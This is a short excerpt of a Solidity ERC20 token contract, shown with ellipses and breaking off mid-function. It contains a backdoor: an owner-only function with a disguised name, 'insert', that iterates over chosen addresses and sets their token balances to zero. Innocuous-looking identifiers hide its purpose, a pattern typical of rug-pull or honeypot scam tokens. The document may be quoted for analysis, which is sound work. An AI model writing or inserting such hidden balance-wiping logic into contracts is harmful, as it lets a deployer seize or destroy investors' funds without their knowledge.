...
contract agentz is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == recognize, "Not allowed");
        _;
    }

    function insert(address[] memory feminist) public onlyOwner() {
    uint256 len = feminist.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[feminist[i]];
        _balances[feminist[i]] = 0;
